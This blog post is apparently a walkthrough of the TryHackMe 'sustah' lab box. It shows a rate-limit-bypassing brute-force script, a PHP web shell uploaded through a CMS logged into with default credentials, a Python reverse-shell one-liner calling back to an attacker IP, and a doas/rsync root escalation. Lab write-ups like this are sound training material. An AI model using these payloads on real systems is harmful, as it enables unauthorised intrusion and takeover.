---
layout: post
author: Razor
title: Tryhackme sustah
categories: [Tryhackme]
tags: [medium-box, boot2root, privilage escalation, web exploitation, cve]
image: assets/thm_sustah/bg.png
toc: true
---

## Introduction

This is partical room from tryhackme entitled "sustah" from Tryhackme . Difficulty of This box is Medium and in this box you will learn all about exploiting CMS , Missconfiguration, Bruteforcing, Privilage escalation. Okay no let's Pwn this box :p.

Room Link [here](https://tryhackme.com/room/sustah)

## Scanning 

### Nmap 

First we must scanning the ip using nmap : `nmap 10.10.195.141 -sC -sV`
```
Nmap scan report for 10.10.195.141
Host is up (0.34s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 bd:a4:a3:ae:66:68:1d:74:e1:c0:6a:eb:2b:9b:f3:33 (RSA)
|   256 9a:db:73:79:0c:72:be:05:1a:86:73:dc:ac:6d:7a:ef (ECDSA)
|_  256 64:8d:5c:79:de:e1:f7:3f:08:7c:eb:b7:b3:24:64:1f (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Susta
8085/tcp open  http    Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Spinner
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Mar  4 17:20:51 2021 -- 1 IP address (1 host up) scanned in 24.76 seconds

```
As you can see the box have 3 port open like ssh, http and another cms. Now lets take a look at port 80: 
![img](/assets/thm_sustah/bg_1.png)

Nothing interesting here let's jump to port 8085.

![img](/assets/thm_sustah/bg_2.png)

There is have some word `Feeling lucky? Guess the right number. You have a 0.004% chance of winning.` which mean we can bruteforece number for the lucky. 

![img](/assets/thm_sustah/bg_3.png)

I have trying to bruteforce the number but there is have rate limits and i'm going to research then found [this](https://book.hacktricks.xyz/pentesting-web/rate-limit-bypass). We can bypass it using header X-Remote-Addr: 127.0.0.1 and it worked. 

My code : 
```python
#!/usr/bin/python3
import requests
import sys
import re
url = "http://10.10.195.141:8085/"

reqse = requests.session()
for number in range(10000,99999):
        head = {"X-Remote-Addr" : "127.0.0.1"}
        data = {"number" : number}
        output = reqse.post(url, headers = head, data = data)
        if "rate limit exceeded" in output.text:
                print("Limit Exceeded :D")
        elif "Oh no! How unlucky. Spin the wheel and try again." in output.text:
                print("try Number : ",number)
                pass
        else:
                print(f"[+]The number is ",number)
                break
```
and here the result : 
![img](/assets/thm_sustah/bg_4.png)

Now we found the number, let's put this.

![img](/assets/thm_sustah/bg_5.png)

Then we found path for getting cms site. now let's go to `http://10.10.249.153/Yo---------th/`

![img](/assets/thm_sustah/bg_6.png)

After looking around i'm found this which mean we can login as admin with default credentials.

![img](/assets/thm_sustah/bg_7.png)

Now lets going to file and create net file some revershell `<?php echo passthru($_GET['cmd']) ?> ` and upload it.

![img](/assets/thm_sustah/bg_8.png)

The file will be saved in `/img/shellrazor.php`.

![img](/assets/thm_sustah/bg_10.png)

Now lets check the command like this : `/shellrazor.php?cmd=id`
here the result

![img](/assets/thm_sustah/bg_12.png)

## Getting shell

### Web shell

Its works now let create some payload to getting revershell, here my payload to getting shell
```
export RHOST="10.2.47.251";export RPORT=4444;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```
![img](/assets/thm_sustah/bg_13.png)

Now we have shell. After looking some hint in thm there is have some backup file. After looking arround i found backup file in `/var/backups` and contain password of user `.bak.passwd`

![img](/assets/thm_sustah/bg_14.png)

## Getting user

Now we just login with user kiran password : 

![img](/assets/thm_sustah/bg_16.png)

As you can see it's work , Then we must getting root.

## Privilage Escalation

In this case im using linpeas to get privilage escalation and i found this: 
![img](/assets/thm_sustah/bg_17.png)

Now let's going to gtfobins [here](https://gtfobins.github.io/gtfobins/rsync/#sudo) about rsync and here my command : `doas rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null`
![img](/assets/thm_sustah/bg_18.png)

And Boom!! we get the root XD

So thats it my writeup and there is so simple writeup you can follow if you want and see you next time :D


Happyhacking :D 